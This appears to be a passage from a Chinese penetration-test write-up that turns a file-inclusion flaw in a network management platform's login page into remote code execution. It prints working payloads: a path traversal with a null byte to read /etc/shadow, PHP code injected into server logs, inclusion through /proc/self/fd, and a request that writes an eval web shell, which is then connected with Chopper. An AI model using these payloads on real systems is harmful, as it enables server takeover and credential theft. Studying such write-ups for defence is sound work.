## **3\. 进行Web测试**

打开首页，页面长这个样子。(为了安全，本人把仅有的图片进行了F12隐藏大法)。就是一个网络管理平台登录处

/index.php?m=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fshadow%00Login&a=checkLogin

### 3.3日志文件包含getshell

shadow突然成302无法读取，于是打算转换思路，换成包含日志文件getshell

首先简单构造个phpinfo

```
https://192.168.111.111/index.php?m=<?=phpinfo();?>
```

apache日志文件存放路径

```
/var/log/httpd/access\_log
```

之后进行包含apache的日志文件，在第一次测试包含apache日志文件的时候成功显示了日志文件内容

但是当第二次访问又返回了302，顿时间懵了圈

![](../Images/3630960d1fb0d8fffd061a85a26f53e7.png)

### 3.4 php伪协议发现的新大陆

既然上面两种方式都凉凉，转换一下思路，在最开始信息搜集的时候，找到了一个目录遍历，看看能不能使用php伪协议读一些敏感文件

之后回显报错了，显示的是file\_put\_contents这个函数，更蒙圈了

```
file\_put\_contents(./Temp/php://filter/read=convert.base64-encode/resource=文件名) \[<a href='function.file-put-contents'>function.file-put-contents</a>\]: failed to open stream: No such file or directory in <b>
```

![](../Images/d976b56ea386b8625ee2283083dc71d1.png)

传一个1.txt试试，返回302但没报错，顿时间恍然大悟了，根据上面报错信息得知，该1.txt可能被file\_put\_contents存到了Temp目录中

![](../Images/66206d8cc2a0989421133bd25079fba7.png)

之后查看Temp/1.txt  确实发现有一些内容写入到了1.txt ，不过没利用点，就是return返回了一个数组

![](../Images/32b48020f4cfa3a0f74756275094af10.png)

内容不可控，就很郁闷了，于是进行了跨目录创建文件，看看会不会写入其它的内容

试试跨目录写入到  /Framework/Lib/  中

但是上传的时候，发现在这个路径里面1.txt被拼接成了1.txt\_zh-cn\_lang.php  

![](../Images/547b116f8744e5ee02e4a243378c54c4.png)

直接%00截断进行绕过，之后成功上传1.txt，难道有戏了？

![](../Images/9ed4a248ae79f2b5d1fd79e6efa22885.png)

之后访问，又是这个鸟样子 ，顿时我的内心是崩溃的，虽说文件创建了，但是内容一直不可控~只能在另寻他法了![](../Images/15846f11101f12cfa561e1b06bf0eb9e.png)

![](../Images/ee663a9814edd00fe41acdba596eae20.png)

### 3.5 proc/self/fd/日志getshell

此时已是中午，吃完饭之后，和heihu师傅打了个电话求救。(ps：他就是经常在Freebuf发文的审计大牛)

heihu师傅听完我的翻车遭遇之后，于是转换了思路。但还是用到了日志getshell。他告诉我日志其实在linux里面**proc/self/fd/1-100**之内也是可能会存在日志记录的

那就一步步的来，在useragent写入个phpinfo，写入完成之后进行遍历1-100，看看能否成功包含

![](../Images/9b1e99a9905ab697c64f819f6f598be6.png)

之后进行爆破，从1-100以内，看哪个文件存在日志能成功包含

![](../Images/2f75e16a1cc209de72b7bcf5945a9c86.png)

当遍历到**proc/self/fd/12**时，成功读取到日志文件，但是没有找到phpinfo

![](../Images/88a498b46fc6087612f5cce80b33b303.png)

再次更改一下，直接访问带有一句话的请求，看看能否成功

```
/index.php?m=../../../../../../proc/self/fd/<?=eval($\_REQUEST\[c\]);?>
```

不出意外的成功了，再一次进行访问**proc/self/fd/12**打算执行phpinfo的时候，又成302了，明明一句话已经成功包含了，但是还是不能使用

![](../Images/4809948cfb278deefb50c42deb15a7a4.png)

heihu师傅此时发现了猫腻，说：**会不会该日志文件被写入了之前1.txt中return那些乱七八糟的内容**

之后进行了小改造，并再次遍历**proc/self/fd/1-100进行包含**

```
/index.php?m=../../../../../../proc/self/fd/<?=file\_put\_contents('/proc/self/cwd/shell.php','<?=eval($\_REQUEST\[c\]);?>');?>
```

终于成功getshell

![](../Images/94dc45b290c01cfd44c9d6494522466f.png)

菜刀成功连接

![](../Images/60e7a58cd0200ce2c384591071fa76a9.png)

## **4 疑问解决**

拿到shell之后，发现权限很大，顿时间我就懵了，为什么权限这么大，而先前读取的shadow的用户和密码无法登录呢？

查看etc/shadow发现，果真是之前那些return的内容写入到了etc/shadow  怪不得不能登录到服务器，

由此得知，当第一次包含该文件的时候，其实就会执行

```
file\_put\_contents(包含的文件路径，写死的内容)
```

并返回正常内容。当再次包含的时候，该文件里面就是写死的那些php代码，从而会直接302跳转

![](../Images/d8d6d0ba48c58b3e81322e282c228ba3.png)

最后进行代码的简要分析，其实可以看到在/Framework/Lib/中创建文件的操作，MODULE\_NAME就是可控点，而$content就是写死的内容，至此就有了开头的一幕，我与老师的对话~~

![](../Images/2cfa7fe7959a83639f58f11599c6c4de.png)
